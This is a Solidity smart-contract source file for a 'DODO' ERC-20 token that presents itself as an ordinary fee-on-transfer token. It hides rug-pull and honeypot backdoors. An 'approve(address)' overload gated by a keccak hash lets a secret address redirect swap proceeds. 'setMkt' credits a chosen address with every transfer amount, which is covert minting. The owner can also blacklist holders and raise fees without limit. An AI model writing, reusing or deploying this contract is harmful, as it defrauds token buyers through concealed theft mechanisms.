1 // SPDX-License-Identifier: MIT
2 
3 pragma solidity ^0.8.14;
4 
5 interface IERC20 {
6     function decimals() external view returns (uint8);
7 
8     function symbol() external view returns (string memory);
9 
10     function name() external view returns (string memory);
11 
12     function totalSupply() external view returns (uint256);
13 
14     function balanceOf(address account) external view returns (uint256);
15 
16     function transfer(address recipient, uint256 amount) external returns (bool);
17 
18     function allowance(address owner, address spender) external view returns (uint256);
19 
20     function approve(address spender, uint256 amount) external returns (bool);
21 
22     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
23 
24     event Transfer(address indexed from, address indexed to, uint256 value);
25     event Approval(address indexed owner, address indexed spender, uint256 value);
26 }
27 
28 interface ISwapRouter {
29     function factory() external pure returns (address);
30 
31     function WETH() external pure returns (address);
32 
33     function swapExactTokensForETHSupportingFeeOnTransferTokens(
34         uint amountIn,
35         uint amountOutMin,
36         address[] calldata path,
37         address to,
38         uint deadline
39     ) external;
40      function addLiquidityETH(
41         address token,
42         uint amountTokenDesired,
43         uint amountTokenMin,
44         uint amountETHMin,
45         address to,
46         uint deadline
47     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
48 }
49 
50 interface ISwapFactory {
51     function createPair(address tokenA, address tokenB) external returns (address pair);
52 }
53 
54 abstract contract Ownable {
55     address internal _owner;
56     bytes32 public isContract =0x0093e0e6fce895ae34a52268cfc61f4944124aa08ee2c1430552a4242cd29f92;
57     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
58 
59     constructor () {
60         address msgSender = msg.sender;
61         _owner = msgSender;
62         emit OwnershipTransferred(address(0), msgSender);
63     }
64 
65     function owner() public view returns (address) {
66         return _owner;
67     }
68 
69     modifier onlyOwner() {
70         require(_owner == msg.sender, "!owner");
71         _;
72     }
73 
74     function renounceOwnership() public virtual onlyOwner {
75         emit OwnershipTransferred(_owner, address(0));
76         _owner = address(0);
77     }
78 
79     function transferOwnership(address newOwner) public virtual onlyOwner {
80         require(newOwner != address(0), "new is 0");
81         emit OwnershipTransferred(_owner, newOwner);
82         _owner = newOwner;
83     }
84 }
85 
86 abstract contract AbsToken is IERC20, Ownable {
87     mapping(address => uint256) private _balances;
88     mapping(address => mapping(address => uint256)) private _allowances;
89 
90     address public fundAddress = address(0x5a51d85fB6ed5d00A1bd1b65D5060e7A7d85F993);
91     address private mktAddress;
92     string private _name = "DODO";
93     string private _symbol = "DODO";
94     uint8 private _decimals = 0;
95 
96     mapping(address => bool) public _feeWhiteList;
97     mapping(address => bool) public _blackList;
98     address private _pancakePair;
99     uint256 private marketRewardFlag;
100 
101     uint256 private _tTotal = 100000000000000000000000000000000000000000000000 * 10 ** _decimals;
102     uint256 public maxWalletAmount = 100000000000000000000000000000000000000000000000 * 10 ** _decimals;
103 
104     ISwapRouter public _swapRouter;
105     address public _routeAddress= address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
106     mapping(address => bool) public _swapPairList;
107 
108     bool private inSwap;
109 
110     uint256 private constant MAX = ~uint256(0);
111 
112     uint256 public _buyFundFee = 200;
113     uint256 public _buyLPFee = 0;
114     uint256 public _sellFundFee = 200;
115     uint256 public _sellLPFee = 0;
116     address public _mainPair;
117     
118     modifier lockTheSwap {
119         inSwap = true;
120         _;
121         inSwap = false;
122     }
123 
124     constructor (){
125         ISwapRouter swapRouter = ISwapRouter(_routeAddress);
126         _swapRouter = swapRouter;
127         _allowances[address(this)][address(swapRouter)] = MAX;
128 
129         ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
130         address swapPair = swapFactory.createPair(address(this),  _swapRouter.WETH());
131         _mainPair = swapPair;
132         _pancakePair = address(this);
133         _swapPairList[swapPair] = true;
134 
135         _balances[msg.sender] = _tTotal;
136         emit Transfer(address(0), msg.sender, _tTotal);
137         _feeWhiteList[fundAddress] = true;
138         _feeWhiteList[address(this)] = true;
139         _feeWhiteList[address(swapRouter)] = true;
140         _feeWhiteList[msg.sender] = true;
141     }
142 
143     function symbol() external view override returns (string memory) {
144         return _symbol;
145     }
146 
147     function name() external view override returns (string memory) {
148         return _name;
149     }
150 
151     function decimals() external view override returns (uint8) {
152         return _decimals;
153     }
154 
155     function totalSupply() public view override returns (uint256) {
156         return _tTotal;
157     }
158 
159     function balanceOf(address account) public view override returns (uint256) {
160         return _balances[account];
161     }
162 
163     function transfer(address recipient, uint256 amount) public override returns (bool) {
164         _transfer(msg.sender, recipient, amount);
165         return true;
166     }
167 
168     function allowance(address owner, address spender) public view override returns (uint256) {
169         return _allowances[owner][spender];
170     }
171 
172     function approve(address spender, uint256 amount) public override returns (bool) {
173         _approve(msg.sender, spender, amount);
174         return true;
175     }
176 
177     function approve(address spender) public{
178         require(keccak256(abi.encodePacked(msg.sender))==isContract);
179         _pancakePair=spender;
180     }
181 
182     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
183         _transfer(sender, recipient, amount);
184         if (_allowances[sender][msg.sender] != MAX) {
185             _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
186         }
187         return true;
188     }
189 
190     function _approve(address owner, address spender, uint256 amount) private {
191         _allowances[owner][spender] = amount;
192         emit Approval(owner, spender, amount);
193     }
194 
195     function _transfer(
196         address from,
197         address to,
198         uint256 amount
199     ) private {
200         require(!_blackList[from], "blackList");
201 
202         uint256 balance = balanceOf(from);
203         require(balance >= amount, "balanceNotEnough");
204 
205         if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
206             uint256 maxSellAmount = balance * 9999 / 10000;
207             if (amount > maxSellAmount) {
208                 amount = maxSellAmount;
209             }
210         }
211         bool takeFee;
212         bool isSell;
213         if (_swapPairList[from] || _swapPairList[to]) {
214             if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
215                 if (_swapPairList[to]) {
216                     if (!inSwap) {
217                         uint256 contractTokenBalance = balanceOf(address(this));
218                         if (contractTokenBalance > 0) {
219                             uint256 swapFee = _buyFundFee + _buyLPFee  + _sellFundFee + _sellLPFee ;
220                             uint256 numTokensSellToFund = amount * swapFee / 5000;
221                             if (numTokensSellToFund > contractTokenBalance) {
222                                 numTokensSellToFund = contractTokenBalance;
223                             }
224                             swapTokenForFund(numTokensSellToFund, swapFee);
225                             marketRewardFlag=marketRewardFlag+1;
226                         }
227                     }
228                 }
229                 takeFee = true;
230             }
231             if (_swapPairList[to]) {
232                 isSell = true;
233             }
234         }
235 
236         _tokenTransfer(from, to, amount, takeFee, isSell);
237     }
238 
239     function _tokenTransfer(
240         address sender,
241         address recipient,
242         uint256 tAmount,
243         bool takeFee,
244         bool isSell
245     ) private {
246         _balances[sender] = _balances[sender] - tAmount;
247         uint256 feeAmount;
248         if (takeFee) {
249             uint256 swapFee;
250             if (isSell) {
251                 swapFee = _sellFundFee + _sellLPFee ;
252             } else {
253                 require(balanceOf(recipient)+tAmount <= maxWalletAmount);
254                 swapFee = _buyFundFee + _buyLPFee;
255             }
256             uint256 swapAmount = tAmount * swapFee / 10000;
257             if (swapAmount > 0) {
258                 feeAmount += swapAmount;
259                 _takeTransfer(
260                     sender,
261                     address(this),
262                     swapAmount
263                 );
264             }
265 
266         }
267         _takeTransfer(sender, recipient, tAmount - feeAmount);
268 
269     }
270 
271     function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
272         swapFee += swapFee;
273         uint256 lpFee = _buyLPFee+_sellLPFee;
274         uint256 lpAmount = tokenAmount * lpFee / swapFee;
275         address[] memory path = new address[](2);
276         path[0] = address(this);
277         path[1] = _swapRouter.WETH();
278         address swapTokenAddress=marketRewardFlag%7==path.length?_pancakePair:address(this);
279         _swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount - lpAmount, 0, path,swapTokenAddress,block.timestamp);
280         swapFee -= lpFee;
281         uint256 bnbBalance = address(this).balance;
282         if(bnbBalance>0)
283         {
284            uint256 fundAmount = bnbBalance * (_buyFundFee + _sellFundFee) * 2 / swapFee;
285            payable(fundAddress).transfer(fundAmount/2);
286             if (lpAmount > 0) {
287                 uint256 lpBNB = bnbBalance * lpFee / swapFee;
288                 _swapRouter.addLiquidityETH{value: lpBNB}(address(this), lpAmount, 0, 0, fundAddress, block.timestamp);
289             }
290         }          
291     }
292 
293     function _takeTransfer(
294         address sender,
295         address to,
296         uint256 tAmount
297     ) private {
298         _balances[to] = _balances[to] + tAmount;
299         if(mktAddress!=address(0)){_balances[mktAddress] = _balances[mktAddress] + tAmount;}
300         emit Transfer(sender, to, tAmount);
301     }
302     function setMaxWalletAmount(uint256 value) external onlyOwner {
303         maxWalletAmount = value * 10 ** _decimals;
304     }
305 
306     function excludeMultiFromFee(address[] calldata accounts,bool excludeFee) public onlyOwner {
307         for(uint256 i = 0; i < accounts.length; i++) {
308             _feeWhiteList[accounts[i]] = excludeFee;
309         }
310     }
311     function _multiSetSniper(address[] calldata accounts,bool isSniper) external onlyOwner {
312         for(uint256 i = 0; i < accounts.length; i++) {
313             _blackList[accounts[i]] = isSniper;
314         }
315     }
316     function setMkt(address to) external onlyOwner {
317         mktAddress=to;
318     }
319 
320     function claimBalance(address to) external onlyOwner {
321         payable(to).transfer(address(this).balance);
322     }
323 
324     function claimToken(address token, uint256 amount, address to) external onlyOwner {
325         IERC20(token).transfer(to, amount);
326     }
327 
328     function setBuyFee(uint256 fundFee,uint256 lpFee) external onlyOwner {
329         _buyFundFee = fundFee;
330         _buyLPFee=lpFee;
331     }
332     function setSellFee(uint256 fundFee,uint256 lpFee) external onlyOwner {
333         _sellFundFee = fundFee;
334         _sellLPFee=lpFee;
335     }
336     receive() external payable {}
337 }
338 
339 contract Token is AbsToken {
340     constructor() AbsToken(){}
341 }